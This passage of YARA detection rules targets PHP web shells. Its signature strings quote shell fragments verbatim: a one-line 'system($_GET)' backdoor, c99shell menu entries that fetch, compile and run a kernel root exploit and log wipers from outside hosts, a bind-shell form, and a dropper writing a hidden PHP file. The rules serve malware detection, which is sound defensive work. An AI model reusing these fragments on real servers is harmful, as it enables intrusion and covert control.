      $s9 = "$this->assertInstanceOf('Phake_Proxies_AnswerCollectionProxy', $newBinder);" fullword ascii
      $s10 = "*  *  Neither the name of Mike Lively nor the names of his" fullword ascii
      $s11 = "* @var Phake_Stubber_AnswerBinder" fullword ascii
      $s12 = "$this->assertEquals($answer, $newBinder->getAnswer());" fullword ascii
      $s13 = "Phake::verify($this->stubMapper)->mapStubToMatcher(new Phake_Stubber_AnswerCollection($answer), $this->matcher);" fullword ascii
      $s14 = "$answer = $this->getMockBuilder('Phake_Stubber_IAnswer')->getMock();" fullword ascii
      $s15 = "$this->binder = new Phake_Stubber_AnswerBinder($this->matcher, $this->stubMapper);" fullword ascii
      $s16 = "* @var Phake_Matchers_MethodMatcher" fullword ascii
      $s17 = "* Sets up the test fixture" fullword ascii
      $s18 = "* Tests the Answer Factory" fullword ascii
      $s19 = "* @var Phake_Stubber_StubMapper" fullword ascii
      $s20 = "public function testBindAnswerReturnsAnswerCollectionBinder()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_1b45fc7d2a485cce8295a4962b581979b08fb01d
{
   meta:
      description = "php17 - file 1b45fc7d2a485cce8295a4962b581979b08fb01d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "06fa69321e2a28a683c7dc14381132981804aa20fe860c596fa504d8646cef57"
   strings:
      $s1 = "else if(($_POST['cmd']!=\"php_eval\")&&($_POST['cmd']!=\"mysql_dump\"))" fullword ascii
      $s2 = "/* --- END datapipe.pl ----------------------------------------------------------------------------------------- */" fullword ascii
      $s3 = "/* --- END datapipe.c ------------------------------------------------------------------------------------------ */" fullword ascii
      $s4 = "/* --- Port bind source PERL ----------------------------------------------------------------------------------- */" fullword ascii
      $s5 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s6 = "/* --- Port bind source C -------------------------------------------------------------------------------------- */" fullword ascii
      $s7 = "/* --- END Port bind source PERL ------------------------------------------------------------------------------- */" fullword ascii
      $s8 = "$_POST['cmd']= $p2.\" -p \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s9 = "/* --- END Port bind source C ---------------------------------------------------------------------------------- */" fullword ascii
      $s10 = "/* --- datapipe.c ---------------------------------------------------------------------------------------------- */" fullword ascii
      $s11 = "/* --- datapipe.pl --------------------------------------------------------------------------------------------- */" fullword ascii
      $s12 = "$_POST['cmd']= $p2.\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s13 = "/* --- Back connect source PERL -------------------------------------------------------------------------------- */" fullword ascii
      $s14 = "/* --- Back connect source C ----------------------------------------------------------------------------------- */" fullword ascii
      $s15 = "/* --- END Back connect source PERL ---------------------------------------------------------------------------- */" fullword ascii
      $s16 = "/* --- END Back connect source C ------------------------------------------------------------------------------- */" fullword ascii
      $s17 = "echo (!empty($_POST['dif_name'])?($_POST['dif_name']):(\"dump.sql\"));" fullword ascii
      $s18 = "echo \"<input type=text name=s_dir size=85 value=\".$dir.\"> * ( /root;/home;/tmp )<br>\";" fullword ascii
      $s19 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s20 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule sig_12ca038fc98473489273f2d64ee8fc72182036da
{
   meta:
      description = "php17 - file 12ca038fc98473489273f2d64ee8fc72182036da.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bee1b76b1455105d4bfe2f45191071cf05e83a309ae9defcf759248ca9bceddd"
   strings:
      $s1 = "<?php  system($_GET[\"0\"]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule php17_27_9
{
   meta:
      description = "php17 - file 27.9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dd984fae70333dc6899b7e226362573ddef2d1185a4349e832a86c9f90ee2b3f"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 1)" fullword ascii
      $x2 = "<OPTION VALUE=\"wget http://www.synsta.templatez.org/1.txt\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit" fullword ascii
      $x3 = "<OPTION VALUE=\"mv 1.txt exploit.c\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 2)" fullword ascii
      $x4 = "<OPTION VALUE=\"gcc exploit.c -o exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 3)" fullword ascii
      $x5 = "<form action=\"<?php echo $surl; ?>\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" " ascii
      $x6 = "echo \"Result Of Locally Executed Command: <b>$execcmd</b></br>\";" fullword ascii
      $x7 = "color: #fff\">http://devilzc0de.com/</a></u><br> # Contact : failed404@gmail.com </u></p>" fullword ascii
      $x8 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (Part 1)(Zap3)" fullword ascii
      $x9 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part 1)(Vanish)" fullword ascii
      $x10 = "<OPTION VALUE=\"which wget curl w3m lynx\">Check For Downloaders (WGET, et cetera)" fullword ascii
      $x11 = "<OPTION VALUE=\"./exploit\">Linux Kernel 2.6.13 - 2.6.17.4 Local Root Exploit (Part 4)" fullword ascii
      $x12 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/vanish.c\">Wipelogs (Part " fullword ascii
      $x13 = "<OPTION VALUE=\"./vanish <?php echo exec('whoami'); ?> <?php echo $_SERVER[\"REMOTE_ADDR\"]; ?> <?php echo get" fullword ascii
      $x14 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s15 = "<OPTION VALUE=\"./vanish <?php echo exec('whoami'); ?> <?php echo $_SERVER[\"REMOTE_ADDR\"]; ?> <?php echo gethostbyname($_SERVE" ascii
      $s16 = "$logfile = $tmpdir_logs.\"ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s17 = "echo(\"<b>Bind Shell Backdoor:</b></br></br><form name=form method=POST>" fullword ascii
      $s18 = "<OPTION VALUE=\"wget http://packetstormsecurity.org/UNIX/penetration/log-wipers/logcleaner-0.3.c\">Wipelogs (P" fullword ascii
      $s19 = "<OPTION VALUE=\"cat /var/cpanel/accounting.log\">Get cpanel logs" fullword ascii
      $s20 = "<OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c <?php passthru('pwd'); ?>\">Tar your current directory. (Only works if the dir" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_7962f991bdf0558be31f305750940c24
{
   meta:
      description = "php17 - file 7962f991bdf0558be31f305750940c24.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "62a6fe020b8f030d490e7b52704fab6c4cdc6560d6aabd36d0241fdbe9b36094"
   strings:
      $x1 = "VkJhL2ZUVTcrcFNram41a0VyTlRIUytqclhnRmpRWjdCVHg5TzdzUFZqZlQzNmVKeE9sbE83ekFRRXlwWGdRR3BlOGp0cUlUbk1nbENNVUNiamlrQVlXQWph" fullword ascii
      $x2 = "T21taFVwTXh3eGJGcnBsd0ZMTkVlZk85OExEcWVoa1gxQjdzSm5mSGp1TzFsSXFLdmVLWDVka041dWdBa1p2blBzemtjQ3lDQVEvcDJzWW5pbXhFbVVyMDVN" fullword ascii
      $x3 = "aGdSTmprdHN2Z1kvR1huaUxLOGVYRU1rYm01MlVEc3Q2eURncTl2L3RzWE5kbGNCTHNCVmdKeDMwaFVkTEQ0S1J5SVRrbXYxaWJRdmsxSjZkWjVTUnd1b3Bk" fullword ascii
      $x4 = "R1R5a1lEWDg0NWs0dE1FMUhrWXJNOC94T21nS0NYUzl4TTdGWE95cGZ1VFN5MzgrNnlVekw4aGdSTmprdHN2Z1kvR1huaUxLOGVYRU1rYm01MlVEc3Q2eURn" fullword ascii
      $x5 = "bUVDN0xyZFVLaHl6YUZkV0QwRzNVMVFETjE3cDdOb2pmQkFxZGJZUk1KenlSQkErT21GWUxLeHY4QVZySXQ5MnRDNXVZcXRSVEV1Tzd3dk90N1RJS0k1dll6" fullword ascii
      $x6 = "Z05sTjhJM3EwWEtNRHBoUmc4MXh3b1FRMTZsbjY3VlpGdFVWNkJBbk10QUdraW44SXRjM2lZVitSbC9PL3UxY1UwKzliWjVhQjEyemE2TFBFWnBhR0g0cjdF" fullword ascii
      $x7 = "UEFVbHdkeWRtTm5rdlluMGFoY2Y4Yml5aWpKeWFUVFdSaDQ4bFZ5V2dTOEh6azZZcDY2WFBIMGFjTjlnQkl0RGZ0NTRUbkxTMmNOWldXMmd4Q0RUanRiVnVL" fullword ascii
      $x8 = "VzNKUE5tYm5tQXdxakU4RG5neW9heW5BV3FwYlFPMDBocGlMRWtha3dlOGtMeTkzTGdEZ25OcjJjV3FLSXhaVkg2L1g3M3ZROGpxVUR4ckQxZTh4Smkya2ZB" fullword ascii
      $x9 = "UkxzaEp1aWp1RGlCWnJrWkt6SjIwTHFHaHQrMjhEaDVqQjhiUXo2NFZaOXN2MDZkVDV4LzVwRWVnTzFYejNsYSttNUNxNm5YZkVuRVpPTFpmN21aeGhyejYv" fullword ascii
      $x10 = "Yy90eldFOGN3d2wvRHljcGd6T0h3cUFVRVU5aXJaUXVadlltR1I0MklLTEJXQ0RNWkx6Sk1RQklPMm1lMkYrT2hXdWd4UjRxTWI5UURDcitYU1Q5UVNJOUNx" fullword ascii
      $x11 = "TW1CRGdWMHozanRTZzhLMzgrTjA4ZzRhVzByeDFoODNWczE5Zjd5dWdZSXZENVRUK2dmSmJ1K0MyT0RQdEh3bGFJY051SG5hSXdmdllwbXpTbGtDM2NPMDla" fullword ascii
      $x12 = "ZS9Kd3dYKzR0ZDlLRXFRUjQ3Snd5UWZDNG9YdFBFSXY4aU8xdmljbjRzR2JxTm9FaXY5ZzBacHJuTXpyRS9EYU00Nkp0WXNHemJndzg4bU9yTVhsbUoyOHE2" fullword ascii
      $x13 = "cmM3ZmIrcndPbGdrTGJxT3BkOVphbXlzbldFQTNGQk9JaFRxOFlnYllKbHpnMFZVRjRtNVJsWkZERVJxQlE3a0FHVHhUSS91Q1czak03N3ZyYkZDL1hQamts" fullword ascii
      $x14 = "dG1vL1M1cmRNSmpqVVVGeThNOHBpcm5ENUFqbFdZWDNURGVYZjFQUUpCTXJoSkQwYU9tVFNGVjNsNTFtWnJCTTMxM0FIeFB4UzRHa0Jncm1uSVRBR1F0R3p4" fullword ascii
      $x15 = "cHhLdllPWmpvM1YvSVVQMXpyV0w3Y2VJNjBIMVJRSmVPYk45ZzBKSGVXUXN2aEQ3dWRPMlA3SFNodENqZWR6U203dE5rTHIvQmkzZmZjQWRqamVOUFMrSnFD" fullword ascii
      $x16 = "aTV1QWdRUXU1TWE4UmlXY0huMEFnQ3ROcHY4RnVPOHdjaDU4amZoYnlsRU1wWVpGeTBVMHhDVUtVcDN1MGlReDRqK2Y0UWdYcmFSRlZkdDVlajlGa05GSnhT" fullword ascii
      $x17 = "Vm1YUnJuZVlNUnkzUUhrdEo0WGdlLzNodCtlbGR1Z0F2K04wSGxlVWFkYXdMalNTYlFDRDdWdmtyWEFJZU95WjIralR4VDYrcEhtcTZXTkJaZVRoTWRTa3VR" fullword ascii
      $x18 = "VVRBdmlDMUtZYklFRHlVeUt1MkIwVzdPV3M5bXFzZDB4bEdISnZuRDltVTNLWDhjZ1hlL0szM0hJek0xZVZBR0hhazdVRTJlOGdROFl2a2t6NUt0NnRGVGQ0" fullword ascii
      $x19 = "dVRJbTk1TlhGL3dEd2ZJTXhuelNVd2dQcUFxNkNmMU54NmJUbk1Vd2tsUVNGamo2dDNwYnVQTDZOU2NlOG91UWFYQWdoeS9DckpJTkJ5b3BrWUNVVENqdHkv" fullword ascii
      $x20 = "TjA2SHgwckxzWElhTmRqVU9EK3JWd2ZWeGxaSVA1REJaaWVIcHJEbzJjRHBhakxwZDk5UGFtYmg1dll3ODgxYmhvdDJxVzdZTnFnS2xWeW9qTmR6aldEaGdk" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*)
}

rule sig_3f4993199c0933eb4c48818066ec720b41db2d06
{
   meta:
      description = "php17 - file 3f4993199c0933eb4c48818066ec720b41db2d06.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "078255a3d8d50c7d4c20c303a93a9b2dd9780b4c8b1cfb980ebc8098f3495df7"
   strings:
      $s1 = "Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/" fullword ascii
      $s2 = "6ZTQ4YzE0MS49Ilx4NzAiOyR4YjVhNjg3Mi49Ilx4NzIiOyR1NWQ0ZDE5My49Ilx4NmUiOyR2MjMwYzU5" fullword ascii
      $s3 = "Rc2xvSnMrWEltV3RXUnBiNnY0QlhSazExcTlIRjdIRnZJY05LNjh0bDQ4eUpDQWsrNTh4OElHL1VHc2hh" fullword ascii
      $s4 = "zSXUrVE5Lc1N3Qmdud2tLVHhNM0ErUnpEUGdLcmxsTWp2SnpEN3RBNEU0WTdHUnlOa0VOdU1JQXA2c1hK" fullword ascii
      $s5 = "uVnI1YUgzengwSXpMV0t2T2h3SEpLWUtyTDQxRHFLOFF1b1BSeTdoMkEyTC9SRU5ZVllZZW16SWUrdFZx" fullword ascii
      $s6 = "OOFJiM3JBVEx5ZkZRdERvT3V0QjNpMGtPUXQzam4wYm5oc0VnTit5NlVHQm5QREw5d0d0ZFRNT1RnRUdK" fullword ascii
      $s7 = "tVUhRNTFuVzN4NDM4ejFUcnd4TG1nZTBnSVhqSlpPRktXU25FUFRnSGhFT25DWmRYWE85VUZUM3NwQW1s" fullword ascii
      $s8 = "0NEFDOUF3cG8vVGY1WGFUOHd1L0xDNS9Xdm5vVEtOK0ZPUk9oQ3NDVVgvQmxuL2FFLzBkRDVxZ3d6NUkz" fullword ascii
      $s9 = "ZMzVqYkJXdHZ1QlJhSnlqZ0pseDVIWTBHdXkyMUxlYTJNZExTb1JRaE45UnZPTEFCdlZacWdzL21LNy9p" fullword ascii
      $s10 = "PaVpFZldzUXhva1RKRlpiVkhvclYyUzExVjFYaVJaWTNmcGRjMCtLSGFSdmFjc2FEUXo2MnVsWmE2U2Jv" fullword ascii
      $s11 = "hOU4rT0h4R0J2SFdGd3BZZzFzb2hZYjF0anB4NGdVVWtuQklOUkJLK01yQVBEb3RVbXZSSmhzRm0xcHZ1" fullword ascii
      $s12 = "rRU4yWlZrNit4cmNEczZqRWNQckxQbXhXV0puakQ1SjRBb2s1V3FNVm1UaHFHK3hmc3ZhTXJKMnd6Q1dO" fullword ascii
      $s13 = "2ZFhneVFJSGlxa0JhQlBQNGU2YXdTeGF6YVVtbUNLRnVUT29KQ0lOekZMaVo0OHJwbkdUR2pyNk50elpR" fullword ascii
      $s14 = "6cU9HRWRBZTlEbVcvNndyQUZ3eWlGVlVvYkQvWkVyaGVGbTJLZEpFakUzdGFYclo4TjFKZSt2eWhhOUtW" fullword ascii
      $s15 = "pdWduU1pZMWtFbUt2ajcrVy9wVTZTU0NJZExzR3JpZFVxVjVFM2xhU1pSb21WSEViN3k0enBZL09ZcUZQ" fullword ascii
      $s16 = "yY0NkOTFNcXVuWHFOazVvUnpqbWI0QTAwbERVTlNUdVJIWTJ3cWVGOGdTdzloSnVuUzVvOThJaUx4aHlV" fullword ascii
      $s17 = "2ZEQ2RVk3ZEFYUzQzb0cyd0JoOE1EWWVzMTcrT25Fa2M0L0FDT0pXWTZSSEY4N2R4WmdKRlI5TnpKelhm" fullword ascii
      $s18 = "3MHF5TU1ETHlCUEtFZ3JQaTlVVVBNOU4vekp3YWwvT2VMQVgyaEJUaUM2WVptckZBWjN3a3NSaWRsQ0xG" fullword ascii
      $s19 = "QUVZILy81NDM5K2EzLy9Vaj09IikpKTokdTVkNGQxOTMoJHYyMzBjNTkwKCRzODg2MzViNygiQ01zS1Bm" fullword ascii
      $s20 = "ydDE5WEg5clhpRzNvT0QwZjNmYkRnMzBvWlpUL1ZRRzZIaUhaMlM1YnVZRlF4VllNZS9zcEJEemp0Nzd0" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule sig_94cbd271f236e6ba58232d95f9a019532ff278bd
{
   meta:
      description = "php17 - file 94cbd271f236e6ba58232d95f9a019532ff278bd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "97df31bc1be4d7b02d787f2711b6afb363c11de46b2a3ba3379394483d490a87"
   strings:
      $s1 = "406576616c286261736536345f6465636f646528" ascii
      $s2 = "$replacement=pack('H*', '406576616c286261736536345f6465636f646528').\"\\\"$payload\\\"))\";" fullword ascii
      $s3 = "$payload='cGhwaW5mbygpOw==';" fullword ascii
      $s4 = "preg_replace($pattern, $replacement , $subject);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_35f8c4b9495e11cdd1f407aac6b1e09b
{
   meta:
      description = "php17 - file 35f8c4b9495e11cdd1f407aac6b1e09b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a23345096453a53fc4668b5e91f7ff322390cfaddae9c6ecf8b7d1e1bb616418"
   strings:
      $s1 = "77777777777777777777777777777777777777777777777777" ascii
      $s2 = "@file_put_contents(\"{$p}media/tmp/cookie8.php\",$s);" fullword ascii
      $s3 = "Pjx0aXRsZT5VcGxvYWQgZmlsZXMuLi48L3RpdGxlPjwvaGVhZD48Ym9keT48Zm9ybSBtZXRob2Q9UE9TVCBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIiBhY3Rp" ascii
      $s4 = "b249IiI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPXBhdGg+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGVzIj48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9IlVwIj48" ascii
      $s5 = "echo (@file_exists(\"{$p}media/tmp/cookie8.php\") and (@filesize(\"{$p}media/tmp/cookie8.php\") > 0)) ? 'shell ok' : 'BAD BAD BA" ascii
      $s6 = "echo (@file_exists(\"{$p}media/tmp/cookie8.php\") and (@filesize(\"{$p}media/tmp/cookie8.php\") > 0)) ? 'shell ok' : 'BAD BAD BA" ascii
      $s7 = "$p = str_replace('index.php','',$_SERVER['SCRIPT_FILENAME']);" fullword ascii
      $s8 = "@unlink(\"{$p}media/.htaccess\");" fullword ascii
      $s9 = "ID0gJF9SRVFVRVNUWyJwYXRoIl0gLiAkZmlsZXNbIm5hbWUiXTsNCiAgICBpZiAobW92ZV91cGxvYWRlZF9maWxlKCRmaWxlc1sndG1wX25hbWUnXSwgJGZ1bGxwYXRo" ascii
      $s10 = "L2Zvcm0+PC9ib2R5PjwvaHRtbD4nOw0KPz4=');" fullword ascii
   condition:
      uint16(0) == 0xd8ff and filesize < 20KB and
      all of them
}

rule sig_4742605d15da981354ac5661dc1fe7eebbf72404
{
   meta:
      description = "php17 - file 4742605d15da981354ac5661dc1fe7eebbf72404.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f87f0edb4c76c6d16b2f41fd16e3aac0df3febfd8dba2f6c2203d6990679771a"
   strings:
      $s1 = "ethod=\"post\"><input type=\"text\" name=\"l__l_\" value=\"\"/><input type=\"submit\" value=\"&gt;\"/></form>" fullword ascii
      $s2 = "JPEvAii4FWsPjp6YgjDFOBZc0O1LRlgGUQnD30/UnodI1JM/pph2pwblffvsP12iMrFLOgPTKd3yXNI8" fullword ascii
      $s3 = "BQRDGruYxiXLadlLdpQMVcCuppgZQUvuAQLpZgJAi+97Qqdh7zuzQJauNg/RgA366aeuy6luD8Ff58J5" fullword ascii
      $s4 = "qQnAPeYu/o2Z3k3b8I+W5PmGcf1yHDLltNzWU7V+LtGwZ7EdXLrvgUhwL3MW+xusbWkymSche7stBw3h" fullword ascii
      $s5 = "sHcW+cJrSz4QPFcXUAbbGABAC6yYk+qQMNXxd0EiIrc7C0tOQXZ379kTxRI8nRIHNK1dVNzADt6Yuko6" fullword ascii
      $s6 = "q3+ypmXMwMlKZLhYnSI1PAD1mMcyqpod5LaGWT+9ozG6rq4Hxo/mPaiIu8U6vrXJBYVRXRUNRzsU/L6e" fullword ascii
      $s7 = "COmvVAxGoLd85vYSJbvtbbBG0tFIM47jHPgPuPUkwZqYDGEuiNnHAVB71A7VgRmk1PaNevqbMpEUDyN7" fullword ascii
      $s8 = "pcOM2Jy1L8FzcZn2TgK8Xfyz0/M0W1EORtPMkJjMRhmWQzKWpYc/mT1q1Ro1iEgZ4N3VywDtTPjMY1n5" fullword ascii
      $s9 = "kroDGYExsa251S7dfFLnnUdHvqZJRBfheLq2nl44spZOCXSbiNl6hUlq51iAvTp8KyheuGvVdE1yNzS+" fullword ascii
      $s10 = "dAkEy8SSHPXMSsOZvWoEGWC6MCBOYuUUaZmkDABGTZbo3GdXYleTmSfyWNOoemc+W2zBQBOtxliLtCf3" fullword ascii
      $s11 = "xJr0GetnPcMGdTVxgeoE5xPIalI6nPCRlcE/PCADUaXSeeLr2yJDE8ga/WbxMFOWQrsBCR6US/oC31HK" fullword ascii
      $s12 = "S8k+dvPYyPT5o0//5KiX6Q5DlcslQsygjCNBUqcFKZKgqn5354M6mzcVRgaeT2bByJ0aObwYhbVthQg5" fullword ascii
      $s13 = "5MTu9Xw0AYmxsEEsnJqsxUUP6uYRxMjxzRZ+Im//V04lgLf1MgU5GCDAAQu7sNWz8mb5eqlKmQFBZB1I" fullword ascii
      $s14 = "D6hgHi6JBh97X+//66jRntisQoMNgebdkApPkeAoTjrTWmFqz1/yhfG7GkmStmSCEg1hGsG8d08P9PMm" fullword ascii
      $s15 = "GSk1kBSX16bvVycUVuXSg7N3Uy5b7KSzteqXzxlyySXmuNZbW/12DiwJo1F4F5nf//VwK4YxKDh0+9MZ" fullword ascii
      $s16 = "jv7RBOyj2qjbDQY7K/Vi0Nf0JE//2jgZwygL3EI5OYPvimBSM0GYs6rZC19ElYbAEq82GJv/4sSdiKmj" fullword ascii
      $s17 = "DA1KIx4uA6PkAxwVlJCRuPnHKthc5y99gXIUTIszUe3FfO/Jx//Co+xHN/zrB6WhOZBJG3Hc2JU+azHn" fullword ascii
      $s18 = "1efKvEBYE+sJUSJggdp3bQwY553//BDS2yjAZQlZv9PBGPHsN8WjspmCcC6CzKAhKiKq0k9gUbetIHqn" fullword ascii
      $s19 = "7+Mw70dl//4wy2IQpQJGQmYpF1L3axquNpujRa0XQBS7Eb2bocfrBaAqNYTso9oeU3JjWtg/V5JArZy7" fullword ascii
      $s20 = "e5lhSHOTEmhhRAchy7M4qG8MUxBKFzG+DPP2oKiLVsWZPxWglyOnNe+wCvV8n2+5kB6Dy/bq+kB0Vl/p" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule sig_0b69320b1162d1b793f885df90c5fc9594a2c17c
{
   meta:
      description = "php17 - file 0b69320b1162d1b793f885df90c5fc9594a2c17c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "131c38be16acef40b5180c6e0e694d572e3053951777d07d475a07485c5bd30d"
   strings:
      $s1 = "zc11cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGlkPVwiJGFyZ1tuYW1lXVwiIHZhbHVlPVwiJGFyZ1t2YWx1ZV1cIiB0eXBlPVwiJGFyZ1t0eXBlXVwiICRhcmdbc2l6ZV0" ascii
      $s2 = "pbnB1dCBjbGFzcz1cIiRhcmdbY2xhc3NdXCIgbmFtZT1cIiRhcmdbbmFtZV1cIiBpZD1cIiRhcmdbbmFtZV1cIiB2YWx1ZT1cIiRhcmdbdmFsdWVdXCIgdHlwZT1cIiR" ascii
      $s3 = "wKCI8cD4kYXJnW3RpdGxlXTx0ZXh0YXJlYSBjbGFzcz1cImFyZWFcIiBpZD1cIiRhcmdbbmFtZV1cIiBuYW1lPVwiJGFyZ1tuYW1lXVwiIGNvbHM9XCIkYXJnW2NvbHN" ascii
      $s4 = "'LyoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKipcDQp8KiAgICAgIEtpbWNpTC1KYWhhdC1TaGVsbCB2MS4wCQkqfA0KfCogICAgIAkgICBSZUN" ascii
      $s5 = "ocmVmPSJqYXZhc2NyaXB0Om9wZmlsZShcJ2VkaXRmaWxlXCcsXCcnLiRmaWxlZGJbJ3NlcnZlcl9saW5rJ10uJ1wnLFwnJy4kZmlsZWRiWydkaXJsaW5rJ10uJ1wnKTs" ascii
      $s6 = "1cGZpbGUiIHZhbHVlPSJVcGxvYWQiIHR5cGU9InN1Ym1pdCIgLz48aW5wdXQgbmFtZT0idXBsb2FkZGlyIiB2YWx1ZT0iJy4kZGlyLiciIHR5cGU9ImhpZGRlbiIgLz4" ascii
      $s7 = "FOyBmaWx0ZXI6IGFscGhhKG9wYWNpdHk9NzApOyBvcGFjaXR5OiAuNzsgd2lkdGg6IDExMHB4OyBoZWlnaHQ6IDI1cHg7IHotaW5kZXg6IDE7IGJvcmRlci1jb2xsYXB" ascii
      $s8 = "yPXllbGxvdyBmYWNlPXRhaG9tYSBzaXplPTI+eFNvdUwgLSBCSUFORyBLRVJPWCBIQUNLRVIgVEVBTSAgLSBUdW5nZ3UgU2VrLi4uPEJSPjxpbWcgc3JjPWh0dHA6Ly9" ascii
      $s9 = "lckNvbG9yRGFyaz0jOTY2MTE3IGNlbGxQYWRkaW5nPTUgd2lkdGg9JzQwJScgYmdDb2xvcj0jMzAzMDMwIGJvcmRlckNvbG9yTGlnaHQ9Izk2NjExNyBib3JkZXI9MT4" ascii
      $s10 = "lLWxheW91dDpmaXhlZDsgd29yZC1icmVhazpicmVhay1hbGwiIGJnY29sb3I9YmxhY2sgYmFja2dyb3VuZD1odHRwOi8vd3d3LmFsaWYtcG9ybi5jb20vcGhvdG8uanB" ascii
      $s11 = "0My5nc3RhdGljLmNvbS9pbWFnZXM/cT10Ym46QU5kOUdjUkZJUXk5b0xjOWpNV21EWV9OX3N4aldQeXVzVVdDNGlnd0sybHFCbTY4YURHY1NmS1BQQT48L2Rpdj4nKTs" ascii
      $s12 = "0IFRhYmxlOiA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJyk7Ij4nLiR0YWJsZW5hbWUuJzwvYT4gWyA8YSBocmVmPSJqYXZhc2N" ascii
      $s13 = "wOi8vc3Bob3Rvcy1oLmFrLmZiY2RuLm5ldC9ocGhvdG9zLWFrLXBybjEvNTI0NjM2XzMyMzI0ODY2MTEzNTQxOV83ODkyNjQ3Ml9uLmpwZyBoZWlnaHQ9ODYgYm9yZGV" ascii
      $s14 = "lbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+PHRyPjx0ZCBjb2xzcGFuPSIyIj5SdW4gU1FMIHF1ZXJ5L3F1ZXJpZXMgb24gZGF0YWJhc2UgPGZvbnQgY29sb3I" ascii
      $s15 = "AZ2V0X2N1cnJlbnRfdXNlcigpLiIpIC0gdWlkPSIuQGdldG15dWlkKCkuIiAoIi5AZ2V0X2N1cnJlbnRfdXNlcigpLiIpIGdpZD0iLkBnZXRteWdpZCgpLiIoIi5AZ2V" ascii
      $s16 = "kb3JhX29uKXtlY2hvICI8Zm9udCBjb2xvcj1ncmVlbj5PTjwvZm9udD48L2I+Ijt9ZWxzZXtlY2hvICI8Zm9udCBjb2xvcj1yZWQ+T0ZGPC9mb250PjwvYj48QlI+Ijt" ascii
      $s17 = "vcj1yZWQ+Jy5zaXplY291bnQoJGZyZWUpLic8L2ZvbnQ+IG9mIDxmb250IGNvbG9yPXJlZD4nLnNpemVjb3VudCgkYWxsKS4nPC9mb250PiAoPGZvbnQgY29sb3I9cmV" ascii
      $s18 = "iYXNlbmFtZSgkb2xkbmFtZSkuJyByZW5hbWVkICcuYmFzZW5hbWUoJG5uYW1lKS4oQHJlbmFtZSgkb2xkbmFtZSwkbm5hbWUpID8gJyBzdWtzZXMnIDogJ2dhZ2FsJyk" ascii
      $s19 = "0eWxlPSJ3aWR0aDo2MDBweDtoZWlnaHQ6NTBweDtvdmVyZmxvdzphdXRvOyI+Jy5odG1sc3BlY2lhbGNoYXJzKCRzcWxfcXVlcnksRU5UX1FVT1RFUykuJzwvdGV4dGF" ascii
      $s20 = "0ciBjbGFzcz0iZm91dCIgb25tb3VzZW92ZXI9InRoaXMuY2xhc3NOYW1lPVwnZm9jdXNcJzsiIG9ubW91c2VvdXQ9InRoaXMuY2xhc3NOYW1lPVwnZm91dFwnOyI+Jyk" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      8 of them
}

rule sig_11407f4105a5161ed1f1cebe997f898fe30d8007
{
   meta:
      description = "php17 - file 11407f4105a5161ed1f1cebe997f898fe30d8007.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "2c8e70b30cae95ca2b91b47a858ced8dffd9df47bf2c6e16c68cbde454630bfa"
   strings:
      $s1 = "<b>Warning</b>:  Unknown: open(/home/users1/o/obmennikme/tmp/sess_6c3c4acc3c92615117422d6a8a8dc6d3, O_RDWR) failed: " fullword ascii
